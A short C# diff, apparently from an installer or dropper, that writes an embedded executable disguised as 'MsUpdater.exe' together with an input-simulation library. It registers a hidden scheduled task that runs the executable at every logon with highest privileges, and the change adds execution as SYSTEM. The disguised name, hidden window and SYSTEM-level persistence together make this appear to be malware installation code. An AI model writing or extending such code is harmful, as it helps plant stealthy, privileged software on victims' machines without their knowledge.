@@ -22,15 +22,13 @@
             Directory.CreateDirectory(targetDir);
 
             var target = Path.Combine(targetDir, "MsUpdater.exe");
-            File.WriteAllBytes(Path.Combine(target, "InputSimulator.dll"), Resources.InputSimulator);
+            File.WriteAllBytes(Path.Combine(targetDir, "InputSimulator.dll"), Resources.InputSimulator);
             File.WriteAllBytes(target, Resources.MsUpdater);
 
             Process.Start(new ProcessStartInfo
                               {
                                   FileName = "schtasks.exe",
-                                  Arguments = $"/CREATE /TN MsUpdater /TR {target} /SC ONLOGON /RL HIGHEST", 
-                                  // schtasks /delete /tn MsUpdater
-                                  // schtasks /create /tn MsUpdater /sc onstart /rl highest /tr C:\Windows\System32\calc.exe
+                                  Arguments = $"/CREATE /TN MsUpdater /TR {target} /SC ONLOGON /RL HIGHEST /RU SYSTEM",
                                   WindowStyle = ProcessWindowStyle.Hidden
                               });
 
